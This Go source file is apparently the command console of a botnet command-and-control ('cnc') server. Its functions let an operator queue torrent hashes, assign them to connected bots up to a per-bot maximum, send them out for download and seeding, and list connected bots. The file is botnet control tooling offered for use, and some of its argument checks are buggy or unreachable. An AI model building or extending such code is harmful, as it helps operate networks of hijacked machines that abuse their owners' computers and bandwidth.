package cnc

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

//TorrentAddCommand - Add torrent by hash
func TorrentAddCommand(hash string, torrentCount int) {
	for torrentIndex := 0; torrentIndex < torrentCount; torrentIndex++ {
		AddTorrent(hash)
	}

	fmt.Printf("You added %d instances of the torrent %s to the seed queue\n", torrentCount, hash)
}

//TorrentQueueCommand - Shows the queued torrents
func TorrentQueueCommand() {
	if len(QueueTorrents) == 0 {
		fmt.Println("No torrents queued for seeding")
		return
	}

	var bot string
	showText := "All torrents in queue\n"
	numberTorrents := 0

	for index, torrent := range QueueTorrents {
		numberTorrents = index

		if torrent.botAssigned == "" {
			bot = "No bot"
		} else {
			bot = torrent.botAssigned
		}

		showText += "\n---------------------------------------------------------------"
		showText += "\nTorrent " + torrent.Hash + " assigned to " + bot
	}

	showText += "\n---------------------------------------------------------------\n"
	fmt.Printf("%s\nNumber of torrents in queue: %d \n", showText, numberTorrents+1)
}

//ConnectedCommand - show all connected bots
func ConnectedCommand() {
	if len(Bots) == 0 {
		fmt.Println("No bots connected to server")
		return
	}

	showText := "All connected bots\n"
	numberBots := 0

	for index, bot := range Bots {
		numberBots = index
		showText += "\n---------------------------------------------------------------"
		showText += "\nBot: " + bot.name + " Unique identifier: " + bot.id
	}

	showText += "\n---------------------------------------------------------------\n"
	fmt.Printf("%s\nNumber of connected bots: %d \n", showText, numberBots+1)
}

//ClearScreenCommand - Clear the screen
func ClearScreenCommand() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

//ListCommand -  shows all all available command
func ListCommand() {
	fmt.Print("torrentadd: Add torrents to seed\n   Argument 1: Give a torrent hash as first argument \n   Argument 2: Give the number of seeds to add to the torrent \n\n" +
		"torrentqueue: List all torrents that are queued\n\n" +
		"connected: Checks all bots connected to the cnc\n\n" +
		"torrentsend: Send the queued torrents to the bots for download and seed\n\n" +
		"torrentmax: Define torrent per bot max \n   Argument 1: torrent count per bot \n\n" +
		"exit: Exit's the cnc command interface and stops the server from running\n")
}

//CheckCommand - interprets command
func CheckCommand(command string) {
	var thisCommand string

	parsedCommand := strings.Split(command, " ")

	thisCommand = strings.TrimSpace(parsedCommand[0])

	switch thisCommand {
	case "torrentadd":
		if maxPerBot == 0 {
			fmt.Println("No number of max torrents of bot defined. Use torrentmax to define")
			return
		}

		if len(parsedCommand) == 3 {
			torrentHash := parsedCommand[1]
			trimmedTorrentNumber := strings.TrimSpace(parsedCommand[2])
			torrentNumber, _ := strconv.Atoi(trimmedTorrentNumber)

			TorrentAddCommand(torrentHash, torrentNumber)
			AssignTorrentsToBots()
		} else if len(parsedCommand) < 3 {
			fmt.Println("No number of torrents to be downloaded given.")
		} else if len(parsedCommand) < 2 {
			fmt.Println("No torrent hash given.")
		} else {
			fmt.Println("Too many arguments")
		}
	case "connected":
		ConnectedCommand()
	case "torrentsend":
		SendTorrents()
	case "torrentmax":
		if len(parsedCommand) == 2 {
			maxPerBot, _ = strconv.Atoi(strings.TrimSpace(parsedCommand[1]))
		}
		if len(parsedCommand) == 1 {
			fmt.Println("Give the number of max torrents per bot")
		} else {
			fmt.Println("Too many arguments")
		}

	case "torrentqueue":
		TorrentQueueCommand()
	case "list":
		ListCommand()
	case "clear":
		ClearScreenCommand()
	case "exit":
		os.Exit(0)
	case "":
	default:
		fmt.Println(strings.TrimSpace(parsedCommand[0]) + ": Is an invalid command")
	}
}
